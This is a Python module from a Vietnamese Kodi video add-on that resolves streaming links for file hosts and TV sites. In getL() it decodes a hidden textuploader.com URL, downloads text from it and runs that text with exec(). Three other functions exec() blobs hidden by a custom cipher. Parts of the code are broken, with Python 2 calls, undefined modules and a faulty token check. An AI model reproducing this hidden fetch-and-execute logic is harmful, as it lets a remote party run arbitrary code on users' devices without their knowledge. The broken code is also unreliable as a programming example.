from time import sleep
from resources.addon import alert, notify, TextBoxes, ADDON, ADDON_ID, ADDON_PROFILE, LOG, PROFILE
from config import VIETMEDIA_HOST
import xbmcplugin, xbmcaddon, xbmcgui, xbmc, xbmcvfs
from requests.utils import requote_uri
import re, requests, unwise, json, random, urllib, base64
import os, sys
import time, socket,datetime
from resources import fshare
from urllib.parse import quote
#import vmfdecode as vmf
#import urlresolver, socket

USER_VIP_CODE = ADDON.getSetting('user_vip_code')
ADDON_NAME = ADDON.getAddonInfo("name")
PROFILE_PATH = xbmcvfs.translatePath(ADDON_PROFILE)
T='aHR0cDovL3BsYXllci50cnVuZ3VpdC5uZXQvZ2V0P3VybD0='
F1 = 'U2FsdGVkX18tMUoo3k2cYautKONoQ5xHCpLDHBz/RNhTLRbBvHKgrtMKiRks5tw4'
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(xbmcvfs.translatePath('special://home/'), 'userdata')
ADDONDATA = os.path.join(USERDATA, 'addon_data', ADDON_ID)
DIALOG = xbmcgui.Dialog()
vDialog = xbmcgui.DialogProgress()
def fuck(t):
    return (t.decode('base64'))

my_site = ['ok.ru','pornhub','xvideos','youporn','yourupload','xtube','xnxx','weibo','vk.com','vimeo']
def fetch_data(url, headers=None, data=None):
    if headers is None:
        headers = {
                    'User-agent'	: 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 VietMedia/1.0',
                    'Referer'		: 'http://www.google.com',
                    'X-User-VIP'    :  USER_VIP_CODE
                    }
    try:
        if data:
            response = requests.post(url, headers=headers, data=data)
        else:
            response = requests.get(url, headers=headers)
            return (response.body)
    except Exception as e:
        print (e)
        pass

def debug(text):

    filename = os.path.join(PROFILE_PATH, 'getlink.dat')
    if not os.path.exists(filename):
        with open(filename, "w+") as f:
            f.write(text)
    else:
        with open(filename, "wb") as f:
            f.write(text.encode("UTF-8"))

def writesub(text):
    alert("Ghi phụ đề")
    filename = os.path.join(PROFILE_PATH, 'phude.srt' )
    if not os.path.exists(filename):
        with open(filename,"w+") as f:
            f.write("")
    else:
        with open(filename, "wb") as f:
            f.write(text.encode("UTF-8"))

def install_youtube_dl():
    addon_id = 'script.module.youtube.dl'
    youtube_dl_path = os.path.join(USERDATA, 'addons')
    if not os.path.exists(youtube_dl_path):
        xbmc.executebuiltin(f'InstallAddon("{addon_id}")')

def removeNonAscii(s): return "".join(i for i in s if ord(i)<128)
def get(url):

    if 'fshare.vn' in url:
        if 'token' in url:
            match = re.search(r"(\?.+?\d+)",url)
            _token = match.group(1)
            url = url.replace(_token,'')
        if not 'https' in url:
            url = url.replace('http','https')

        return get_fshare(url)

    if 'acestream' in url:
        return getAcestream(url)
    if 'sop:' in url:
        return getSopcast(url)
    if 'vtvgo.vn' in url:
        return get_vtvgo(url)
    if '4share.vn' in url:
        return get_4share(url)
    if 'google.com' in url:
        addon_google = os.path.join(USERDATA, 'addon_data', 'plugin.googledrive')
        filename = os.path.join(addon_google, 'accounts.cfg' )
        if os.path.exists(filename):
            with open(filename, "r") as f:
                content = f.read()
            f.close()
            driveid = re.search(r"\"(.+?)\"",content).group(1)
            doc_id = re.search(r"d\/(.+?)\/", url).group(1)
            video_url = 'plugin://plugin.googledrive/?item_id=%s&driveid=%s&item_driveid=%s&action=play&content_type=video' % (doc_id,driveid,driveid)
            return video_url
        else:
            return getGoogleDrive(url)
    if 'openload' in url:
        return getOpenloadLink(url)
    if "sweetiptv.com" in url:
        return getseetiptv(url)
    else:
        return url

def get_vtvgo(url):
    url = quote(url, safe=':/')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Referer": url,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://vtvgo.vn",
        "X-Requested-With": "XMLHttpRequest"
    }
    session = requests.Session()
    session.headers.update(headers)
    response = session.get(url)
    content = response.text
    #regex = r"var\s+(type_id|id|time|token)\s*=\s*'([^']+)'"
    pattern = re.compile(r"var\s+(type_id|id|time|token)\s*=\s*(?:'([^']+)'|\"([^\"]+)\"|(\d+));")
    matches = pattern.findall(content)

    if matches:
        payload = {}
        for key, value in matches:
            payload[key] = value
    else:
        alert("Không tìm thấy dữ liệu payload.")
    match = re.search(r"-(\d+)\.html", url)
    id_channel = match.group(1)
    data = {
        "type_id": "1",
        "id": id_channel,
        "time": payload.get('time', ''),
        "token": payload.get('token', '')
    }
    response = session.post("https://vtvgo.vn/ajax-get-stream", data=data, verify=False)
    match = re.search(r"(https.+?m3u8)", response.text)
    if match:
        video_url = match.group(1).replace("\/", "/")
        return (video_url+"|'User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F56.0.2924.87%20Safari%2F537.36& Referer=http%3A%2F%2Fvtvgo.vn%2F")
    else:
        return None

def getL(url):
    r=curL('aHR0cHM6Ly90ZXh0dXBsb2FkZXIuY29tL2R5OTR1L3Jhdw=='.decode("base64"))
    exec(fuck(r))
    return video_url


def WcLeeL0vZik1(Dx5X7YPC6MYn, NMr5AAsWvtqg):
    NgotZ9mZPvkD = []
    NMr5AAsWvtqg = base64.urlsafe_b64decode(NMr5AAsWvtqg)
    for i in range(len(NMr5AAsWvtqg)):
        Dx5X7YPC6MYn_c = Dx5X7YPC6MYn[i % len(Dx5X7YPC6MYn)]
        a6LNJYq6KoO4 = chr((256 + ord(NMr5AAsWvtqg[i]) - ord(Dx5X7YPC6MYn_c)) % 256)
        NgotZ9mZPvkD.append(a6LNJYq6KoO4)
    return "".join(NgotZ9mZPvkD)
def cloudfare(url):
    import cfscrape
    scraper = cfscrape.create_scraper()
    user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
    cookie, user_agent = cfscrape.get_tokens(url,user_agent)
    cookie = json.dumps(cookie)
    jstr = json.loads(cookie)
    jstr['cf_clearance']
    cf_clearance = jstr['cf_clearance']
    __cfduid = jstr['__cfduid']
    cookie = 'cf_clearance='+cf_clearance+'; __cfduid='+__cfduid
    return(cookie)
def curL(url):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','referer': url,'cookie': cloudfare(url)}
    r = requests.get(url,headers=headers)
    return (r.content)
def q6c5YwDbZTWH(url):
    exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954',"nZCCq4F7Z5yZiXylgaOBo5uArZySao2ngmp8Z46riIyZZYmgj6WHjIx7m6uOaYWCj4iIf4J9kZiZkKishHubbYd7nmmEdZVlg4mMr4WjfmWHjJtrh3uiZoN0laV_Z3CfnZGDrIxrimyPpGiJj2Njmodno6yPo4-mm7KNsJqkb2aXiYOggIiigpmAi5yTf46xm7B4bn55paCXaIGnkmuhqYOyp5-CaZ9lmXl0rISeb62Za52qnH-gqJqOr6GBnmeemXiaqoJre56Sao6vnHpooZeegKiPfKOskrKYaoJ7nKadpKOsgXR0nY-MkaqRkYeghXt6oZugmqh_ZIisj42Aq5GQmaCbpommh6B4o4mIa2iWjK-qkYxtZYWieZ-DfZull56EqJlohJ6MpYabhox5rYV7qpyLY56ng5-IboGBnGaHe6OfiY95rJd4iIqPjIGDmZGGqoeMhWuEoYRnfnSafoh7iYWMfKybm3-kqpKKeX2PiICkl66inolrna2bammkhLGarYGbc6eCr4xqh3xpaYh7eoyRjpGdmJ6dqIOJhGqEo4Jmg7GvppFpcKqZeIinmXhoZ52Rd6CDsqefgml9rJh4qqKOZ31nmZBuqYVrn6ycaptogYiMqJiiZ6uckX-nk49topppiaGPdaWZjmefn5ung6CdfGmOjnyQqYR0laV_Z31onICdqpylpGidipprfnSWpJZ8cK6ZgKGom3-NrZqkjWV_qqmgmnhosJKRe2WTkIZoko6IqZljnmKWeJptgXyZjY2NsIGcf4msip6IqpmMjbGcfJltfKaCpJuKeG5-eYirl3yvp5GjfqmOpY6wnI6Nr5l0mmOYoq6ne6d_oJyLbaCSfomblniImo98jbCDfJmKnGqOsYSMfaOPiGdif66unoJpZqqepaSrmn58q4OEZql-eJ-PmZBqn5trnLKBfGyKfnWLp4KIop6JkXerm3-OkJKOgYGWiYOog4mEaoSjgmaCe6CEi32Jg4l0qZmXfKOpkox3fJOPhqqasKKchmOaq5dnaKOEs4ashaJ5rYWhgK6EdGapfnuFn5Kme62ai3BphbGaqoKri5mLoqOjnH5moJN_pKCEsXyqgnSVonijgaObbHeqm6aGpIF7Z5yZiXyll3yjoIWiamWcpbCum36NqoB5fJ6YiKKCm6NmrZOQhq-aaWyvj4Rnq4-MfaKDfKB_m49-aJFpnpyFhHSrj4hssZKQe62Sap-nm6CBoI6JhJqBjKOiiI-snYR7bKqIsKOYfpp7pZieooKbgG6unX5xqJJ6eG5-eGOamXyFpoSmma2ba46vg3t8pXieY5qZfIWmgX1lm5ylja2baY2dmJ6AoYB9gKCSkXeknGpxo5KLppyAd6qdgK6ioISBfqR8pY6vmY-Fq494h5mFiHmrkZGHnpp7baabpHBmmHSZqoCGp6uRkYeemnt5cYF_gaGBn4Cejo2BoZl8na2Cpoakm6WRoZiboZmAe6-ig7KgnYWAgah7pYWhmJ-MnpieeHCBgGacnX-Gp4Skm66XZIipgHl8p3umZpydf4angXtnnJieh6ePoqOskoB7p5t7oLGCaK6el55rp45njZqBo6WXgqGfrYOxb6WNdHuggX2Ap3umaqqbpYakgXtnnJeIeGKOZ5-ZhaVlf5N_fmiRinhufnmloI6MhWeZkG6pg7Knn4Jpn52XeJ6mjWd9qJGRnZqcf7CgnY6Nrn-qqaCXonCskWuKooiheq2aaWyfj4SpoI-Neaeba26fk4ubboF-jayWiYCoj3yMqoJsg6CcppKkm6Caa355gJ6Yo5Gjm6Ksopx_cbKcfqOgf6uhmZh8cLGcf26kk4Bog5ugeG5-eYirl3yRo5yAg6OFpnqum2qIpH9jmmKZfXmxh6JtqppqoK6bfp-ll4iqnoGibKOcfG5nnHtpoJJ-aKWXmmuaj3xop5qiZpyapX5shKV5pJh0laV-fJ-jkZCHoJymhXGZfo2dj3iIq5iurp6SgHtkkoxpo5GPiZ2AgqKmjo2JoZl8dm2CgIKkhKWFoY6JfJyWeJ-wgmyDrZKyaZuBoJ6qgKtqoo14gKWEgX6pkqVxo52KooCWiIuZl4x9Z5FrnGp8n6RqmY6JoZdia2OYoq6eiIx3qJKQiqKZemyjmJ5rY5h4nq-DiqR-fJ-kaJulomt4mJ18l4x9Z5FrnJuJi3qxkopsr4-IeKuOZ56mm6J_ZZylr3GDemungIR7pZmio6KSkG6anZCCq4OIpn94iJ6ffnxon5yAg6OIn6eCe4ijZ5aIhJ6XZnBom6asm4mLeqyRj4mflnRnoJiicGibfJyshImngnuIo2eWiISel2ZwaJumrJuJi3pqmY6JoZdia2OYoq6skoCLnptqiqSDeoGejomAnoOfiKCDiqR-fImkqZtqia5-dWKZlqOFrZqiaqeban6jm7CfZ5aIhJ6XZnBom6aspHyfo4J7j5Glj3iIqI1ojbCafHZtgn-ospx_gZeCd2OUfqKRp5qAip2RiaeCe4iigHiCnp6XfYWjh6CkfnyJpGqZjomhl2JrY5iirp6IjHajnKWOspppr2ePiYirl3hssJKRg6qbgJKkg3-RpY94iKiNaI2wmnygpHyfpKSdfoWhmHmDaHicooGRa26qmmqkpIF7Z5yOY6qomYyJpJGRf6CEgJKokn6Nq41kiKuXeKKCe4qhqJKQiqKZenhufnl8noGjhaORkX-emnugsYGkn2WZeXSshJ5vrZxsmWeFpZKkmo6BoY90Z5yXZ2etnKJto4Whq6iBoK9nloiEnpdmcGibpqykfJ-jgpmOkJyXiHhijmeebXugoH58kJKokn6Nq41jnp1-eWeempB7ZJJqn62SaoGrmYlzoYKIooJ7iqB-kpB6qJBqja6XdHNrfnibppyBh6ucsqeuhGqbaJmqZ5-PjGigkpCGqZJqcayEaX2sloRrrJdojbCRa4qqg5CFpoF6jJyZnp6dj4xwnZmQhn98iaOCmX6NnY94iKuYrnhwgYGof3yJo4J7ipufl2NrpJaMjKWHoneem2pxqpmOjKh4mJ18eIaipZpsf6STaqStgrGmnH9jmmKZfXmxh6Jtqp1rnGuEpJGhl4h8no94bKGaa2WihXmngnuIon9_ZIisj42Aq5GQmaCbpommh6B4o4mIa2iWjK-qkYxtZYWieZ-DfZull56EqJlohJ6MpYabhox5rYV7qpyLY56ng5-IboGBnGaHe6OfiY95rJd4iIqPjIGDmZGGqoeMhWuEoYRnfnSafoh7iYWMfKybm3-kqpKKeX2PiICkl66inolrna2bammkhLGarYGbc6eCr4xqh3xpaYh7eoyRjpGdmJ6dqIOJhGqEo4Jmg7Gvg3uIon94hJacl2dsZ5KQamSFkIptm36Mo4Sac6COjXmumoChnpKQiqiaaWurmnRjZZlomquSpm6tm4tpaZukr6GXnoCoj3yNooeyd56af36xm2mNZYWHiIeHnmdrgrKsf3yJo4J7ipudjmOAnph9iKWHonaihKFwqYKwroB4gp18eIibsJKQj6CcpY6xgrGmnJmenp2PjHCdnJF_p4V5p4J7iKJ_f2N4Y5l8n62bpqFknoubboF6m2iZZJWnj6KNq5Gmi5-FpYaumoqaqHiYnXx4hqKlnXxmrZOQfmmSj4Vlj4iDpplno2eZfJhqgnuckYyMr36ZeYSpiqKNr5yQi66de5ure56if3iCnmt4nKKBe5CHnJ1_fZ-Iinlsf2R7oISeeKWCsqyik3ubboF6m2iZZJWnj6KNq5Gmi5-FpYaumoqbbniYnXx4jYCeiIx3ZZylsKWSj4mflnRnqZdohWeDgHurmo5xaZukrqiWeIiaj3yNsJuzZqOTj36jko-Br4F4hJqZfHxwkoB7ZJKLo4N7iKJ_lp-AYpieeHCBgKWum2psrZp-cJ2PeX-hmJ5soJprh2mEiaeCe4ijZ5aIhJ6XZnBom6asm4mLeqmbaomujKp8nY6NiZ-BpWaWho5pmoGkkaWXeIebjYamgXuKoWaaj4qkmmhwZpieqZmFiHilmYGHZJyAhW6EsHBomWSVp4-ijauRpoufhaWGrpqKmqeZnp6dj4xwnZyRf6d8n6OCe4imf3iIiKWYZ4xte6CgfnyQkqiSfo2rjWSIq5d4eHCBfJ1mmo-KpJpocGaYnqmieKKNqptrimp8n6Rom6Wia3iYnXyXjH1nkWucm4mLerGSimyvj4h4q45nnqabon-um2uOsZFpja-EmnOhgZ6qp4R8fqecoW2hmmmJaoCCoXx4jKOkgYBmnJ1_hqeHnqZ_eIKeZJaMiaOaam5lnKWvn4iKeamOiYSclnhspZumbmWce5-wg4imf3iCnqOYaImwgX1lm5qmhq6aoGyol2N4nZiun2mZkIegm2lxaZukrqV4mJ18eI2Rp5KAi6qRa46xmnp4bn54oqyZfYGZhX9mloKlkqiafoyejYKhfHiGo6eSonaik2pxrpJpr6F_qnSil555aJumrGp8n6OCe4ijZ5aIhJ6XZnBom6asm4mLeaebpI2vl2OqZI-NjbCafGqtk5CGrpp_kaGAeYyij3yNrZBsi62be6Ooe56if3iIiKWYZ4xte6CgfnyJpGqZjomhl2JrY5iirp6IjHdmmo-KpJpocGaYnql9eIyNa5Fri6udfKeDe4ijnZd4iKuZeJ6gjmuLnYJ_sqCtbJulfpqdbw==")))
    return (video_url)

def getLbZWhA2HP4ah(url):
    exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','nZCCq4F7Z5yZiXylgaOBo5uArZySao2ngmevnoydlqGGiYGAjX2HnJp7m6uSpY2flqqZoI6Kn4qFgIN5m2uShYVpiK-PeZ1jmWd9f5qBh52PsqSvjH5nZpd4hHSFiWelg4ygf5yheXGBfoVmmJypoZmNgaqDiqWdgnxon5yObGiWiYCegaONrJxroa6TjnGvm6Rwn4-JgKyAfYCne6ZmnJ1_hqeBe2ecmJ6Hp5hnjZ-bpoOjhICBoZGOp52ad6mhmq6baJumrKKIoZunhKCqZICElaV-nq-gg4qlpZxpcaKaaYmhfnVimZeMfWeRa5ypk2uCrpyPeKSChJ19lqOFnZFrbp-Ti3lxgX6nr41jgKiPfIysm6aLq5t_fqKSip6ef6qmZZaMbKKabJipimiwgoqMbIqNYZ6DgK6aoIR8f6mdj7CrgaCigJl5fGeEnKaBm6J2bYJ_hmmboq6klp-AmI5ncKKSjKB_fI-Bn4iKeWaXn5aimGeMrJyQameakIakkGp5rpdjgJ6YaISmm6Kgf3yPaaCcfoWkfnVimZiijKyba4ucnKWGp4N_gJ6ZY3hijmefp5qmmKmcao5oin6Nn5ifnqmZequjnY-so4Oxn62DsW-lf6p7pY6eooJ7joegkmuCbZt_iYGPiZ2ZhYh5q5GRh56ae22mm6RwZph0maqAhqaBmpB7ZJJqn5-Iinmuj4RnrI-MfbCRa5yjnKGCnpukja-YeGunmGeNgptrbqmJjq-mg3prp4WqnpV_roCqkaKgf3yPqLKcf4CchYR0po6NiaGZfGqinKVxaZt6nq2AgqF8lqOFZ5uidm2Cf6iymmlrqpd4a5qPfYSmmaeDZJyho4N7j4ichYR0pY-Ma6aZp4NknKSrppqOjaCWiHisf2Znp3ugoWaaj4qkmmhwZpieqZmFiHmom2yHrZCxnKySjomljol_oI2LqqacfGWshI5pmoJqja6XdJaWeJyjo5uAoa6baoqki46InIWEdKyZfYCmmaeDZJykq6aSj3mlmGNrnY-Ko6KCamWkfJ-ko5KOhauPeIiYmY2BqoF9ZZudpWmlhKSbpY6efJ6YoqOxmX57eo6xoGqZjomhl2JrY5iirqqBfoegkmuCbZt_iYGPiZ2ieJyigpKRnZ6TkHpoh56mf5menp2PjHCdnJF_p4J8aJ-CsJqAeIh4pY-NgWeDfJmMk4-Bn5KPga6XZHuggIamdA==')))
    return(decode_url)

def decode():
    exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','kqVxo52KeG5-eXyemI2No5tsh66FpZyknHp4pH50fKGZfYmuh6Jtqp2AkqeRj6Kql2R8oIFoeaqRkaGgnKWcqoRpn2uOhGepln14oIOMdqmCgIqknX-IgJl4iGaZeHiqgYGPnJymhZ-Iinmuj4Rzp358ha2akXekm3-Nn4N6eKOZnnirfnifmZClra6ffGmcg6CjmJiramuAe6-ZhKKoY5F-aKiCsHiofnl8nn54a56Nsnakgntsn5Kko6qPeHill3h4poGAf6qTgKOfg4p5l351c5mNhqehmmtqZJOPbWiQaaedmZ53mYWIeaOcpnungnufn5ykfa6YqnOieKKrZ4F9ZZuDa6uvno-qrZuElaePonCwmpB7ZIR7m2iFjpBmhHV3q4OfmmySo6BnkrKfspKLgGiOq4eshIx9oYajnZ6Gf4qihqCaqJhja6uZfI2ig4CDqpumiqSapYmblp54ZI6Ir6mSkaBtm3-OrYF6o5eBhXyWgaKJo5Frbp-Ti5-mnI5spY5ja52PiGijm2uDnJx_jaaDiqKAmZ54q4KeeHCBgYOqnKaKpJJ6n5-XY2dij4xsZ5BrpZydpX2rmWmNaoWIqp6XnqOZhI17mIWliqSRaXCgj4SZoJmMbKeRa26fk4tppJtphZ2YeIeggIann4F9ZZucpY2tm2mNnZiegKGAeJtpkZF-m5KMaKeEi3CYj3Slon-ur2mRkX6thIttppukcGaYdJmqgIanoIF9ZZucpY2tm2mNnZiegKGAeJtpkZF-m5KiaKeEi3CYj3Slon-ur2mRkX6thIttppukcGaYdJmqgIanoYF9ZZucpY2tm2mNnZiegKGAeJuwkpGHZZylbJ-Ei2-kjXiDpICImqqcpnuthqGjrZJqgauZiXOhgoiigpyAqaaCfGifgmqqrJuEZ2mCjWelhKaPqpylaaCcep-fgXiep5l4n5-DjHamgn-krZx6n56AhJ19mJ54cIGBi62bf5KknH6FpIGelp6ZeJ6gmYGHZJx8p66EapGlj4mEpo-MiaeRkI6pm6WOaIRpiaGOY2udj4twZ5ymnZyei22vmX94ZJmJfKWFiI2xgaJ2oIKAiqqZsKKAmXilmYWIebCEpn-qk4CjdQ==')))
    return(kt,tkk,tk)
def check_4s():
    username = ADDON.getSetting('4share_username')
    password = ADDON.getSetting('4share_password')

    if len(ADDON.getSetting('4share_username')) == 0 or len(ADDON.getSetting('4share_password')) == 0:
        alert(u'Bạn chưa nhập [COLOR red]tài khoản 4share[/COLOR]')
        ADDON.openSettings()

def login_4s():
    check_4s()
    username = ADDON.getSetting('4share_username')
    password = ADDON.getSetting('4share_password')
    querystring = {"cmd":"get_token"}
    payload = {"username": username,"password": password}
    #Get time saved
    current_time = int(time.time())
    timenow = str(current_time)
    ADDON.setSetting(id="timelog4s",value=timenow)
    #get token 4share
    attempt = 1
    MAX_ATTEMPTS=2
    while attempt < MAX_ATTEMPTS:
        if attempt > 1:
            notify("Login 4share lần #%s" % attempt)
        attempt +=1
        # response = requests.post("https://api.4share.vn/api/v1/", data = payload,params=querystring)
        # json_data = json.loads(response.content)

        json_data = None
        try:
            json_data = callApiPost4S('https://api.4share.vn/api/v1/?cmd=get_token', headers=None, payload = payload)
        except Exception as e:
            alert("Có lỗi login:" + str(e))

        # xbmc.log("--- DEBUG API token_4s1: ", level=xbmc.LOGINFO)
        token_4s = json_data['payload']
        # xbmc.log("--- DEBUG API token_4s: " + token_4s, level=xbmc.LOGINFO)

        if 'Not valid' in token_4s:
            line = "User name: [COLOR yellow]%s[/COLOR]\n" % username
            line += "Password: [COLOR yellow]%s[/COLOR]" % password
            alert(line,title="Kiểm tra lại thông tin")
            ADDON.openSettings()
        else:
            ADDON.setSetting(id="session4s",value=token_4s)
            #notify("Chúc bạn xem phim vui vẻ")
    return token_4s

def check_token_4s():

        token_4s = ADDON.getSetting("session4s")
        if token_4s == '' or "Not valid" or "0" in token_4s:
            token_4s = login_4s()
        else:
            current_time = int(time.time())
            timelog4s = ADDON.getSetting("timelog4s")
            if timelog4s:
                t = current_time - int(timelog4s)
                if int(t) == 0:token_4s = login_4s()
                if int(t) < 2592000:
                    token_4s = ADDON.getSetting("session4s")
                else:token_4s = login_4s()
        return (token_4s)
def get_4file_information(url):
    url_get_file_information = 'https://api.4share.vn/api/v1/?cmd=get_file_info'
    token_4s = check_token_4s()
    headers = {"accesstoken01":token_4s}
    #file_id = str(re.search(r'/f/(\d+)', url).group(1))
    file_id = re.search(r"f/(.+)",url).group(1)
    payload = {'file_id':file_id}
    try:
        r = requests.post(url_get_file_information, headers=headers, data = payload)
        json_data = json.loads(r.content)
        file_name = json_data['payload']['name']
        size = json_data['payload']['size']
        file_size = '{0:.2f}'.format(float(size)/float(1073741824))
        return (file_name,file_size)
    except Exception as e:
        alert("Có lỗi login:" + str(e))


def callApiGet4S(url, headers = None):
    return callApi4S(url, headers = headers, payload = None, post = False)

def callApiPost4S(url, headers = None, payload = None):
    d = callApi4S(url, headers = headers, payload = payload, post = True)
    return d

def callApi4S(url, headers = None, payload = None, post = True):
    text_data = None
    try:
        if post:
            r = requests.post(url, headers=headers, data=payload)
        else:
            r = requests.get(url, headers=headers)
        xbmc.log("--- DEBUG API 4s: " + url, level=xbmc.LOGINFO)
        if r.status_code == 200:
            # Lấy dữ liệu trả về dưới dạng văn bản (Unicode)
            text_data = r.text
            xbmc.log("-- Dữ liệu trả về:")
            xbmc.log(text_data)
        else:
            raise Exception("Yêu cầu không thành công" + url + ", Mã trạng thái:", r.status_code)
        xbmc.log("--- CONTENT: " + r.text, level=xbmc.LOGINFO)

        json_data = json.loads(text_data)
        errorNumber = int(json_data['errorNumber'])
        if(errorNumber != 0) :
             raise Exception(json_data['payload'])
        return json_data
    except Exception as e:
        raise Exception("Call API lỗi: " + url + " | " + str(e))
        xbmc.log("--- ErrorApi4S: " + str(e), level=xbmc.LOGERROR)
    return None


def get_4share(url):
    check_4s()
    token_4s = check_token_4s()
    url = removeNonAscii(url)
    headers = {"accesstoken01":token_4s}
    matches = re.search(r"f\/(.+)", url)
    file_id = matches.group(1)
    payload = {'file_id':file_id}
    #checkfile = get_file_information(url)

    try:
        json_data = callApiPost4S('https://api.4share.vn/api/v1/?cmd=get_download_link', headers=headers, payload=payload)
        link_download = (json_data['payload']['download_link'])
        return requote_uri(link_download)
    except Exception as e:
        alert("Có lỗi getlink: " + str(e))
        return None

def getGoogleDrive(url):
    matches = re.search(r"d\/(.+?)\/", url)
    if matches:
        google_id = matches.group(1)
        url = "https://drive.google.com/uc?export=download&id=%s" % google_id
        url1 = 'https://drive.google.com/uc?authuser=0&id=%s&export=download' % google_id
    headers  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Accept-Encoding" : "gzip, deflate, sdch, br"}
    try:
        r = urlfetch.get(url,headers=headers)
        cookie = r.cookiestring
        regex = r"id=\"uc-download-link\".+?href=\"(.+?)\""
        match = re.search(regex,r.body)
        url = match.group(1)
        video_url = "https://drive.google.com"+url
        video_url = video_url.replace('amp;','')
        headers  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Accept-Encoding" : "gzip, deflate, sdch, br",'cookie':cookie}
        r = urlfetch.get(video_url,headers=headers)
        if r.status == 302:
            link = r.getheader('location')
            return link
        else:
            notify('Quá giới hạn play hôm nay')
    except:
        xbmc.log(url)
        return url1

def getOpenloadLink(url):
    regex = r"https://openload.co.+\/(.{11})\/"
    match = re.search(regex,url)
    movie_id = match.group(1)
    api_url = 'https://api.openload.co/1/streaming/get?file=' + movie_id
    try:
        r = fetch_data(api_url)
        jStr = json.loads(r.body)
    except:
        notify('Error. Try later')
    if jStr.get("status",0) == 200:
        video_url = jStr.get('result',{}).get('url','')
        return video_url
    elif jStr.get("status",0) == 403:
        alert('Hãy vào trang [COLOR yellow]https://olpair.com/[/COLOR] để pairing thiết bị của bạn và thử lại.')

def getAcestream(url):
    if 'plugin:' in url:
        ace_link = url
    else:
        ace_option = ADDON.getSetting('ace')
        if ace_option == 'true':
            ace_link = 'plugin://program.plexus/?mode=1&url='+url+'&name=Video'
        else:
            response = fetch_data('http://127.0.0.1:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback')
            if not response:
                alert('Vui lòng khởi động ứng dụng Acestream. Cài đặt tại [COLOR yellow]acestream.org[/COLOR]')
                return
            else:
                ace_link = url.replace("acestream://", "http://localhost:6878/ace/getstream?id=")
    return ace_link

def getSopcast(url):
    if 'plugin:' in url:
        sopcast_link = url
    else:
        sopcast_link = 'plugin://program.plexus/?mode=2&url='+url+'&name=Video'
    return sopcast_link

def get_hash(m):
    md5 = m or 9
    s = ''
    code = 'LinksVIP.Net2014eCrVtByNgMfSvDhFjGiHoJpKlLiEuRyTtYtUbInOj9u4y81r5o26q4a0v'
    for x in range(0, md5):
        s = s + code[random.randint(0,len(code)-1)]
    return s
def convert_ipv4_url(url):
    host = re.search('//(.+?)(/|\:)', url).group(1)
    addrs = socket.getaddrinfo(host,443)
    ipv4_addrs = [addr[4][0] for addr in addrs if addr[0] == socket.AF_INET]
    url = url.replace(host, ipv4_addrs[0])
    return url

def get_file_info(url,session_id,token):
    data   = '{"token" : "%s", "url" : "%s"}' % (token,url)
    header = {'User-Agent': 'Vietmediaf /Kodi1.1.99-092019','Cookie' : 'session_id=' + session_id }
    r = requests.post('https://118.69.164.19/api/fileops/get',headers=header,data=data)
    regex = r"\"pwd\":(.+?),"
    match = re.search(regex,r.content)
    password = match.group(1)
    return password

def get_fshare(url):
    token, session_id = fshare.check_session()
    # Tham số share=3053519 sẽ được thêm trong hàm get_download_link
    link = fshare.get_download_link(token, session_id, url)
    return link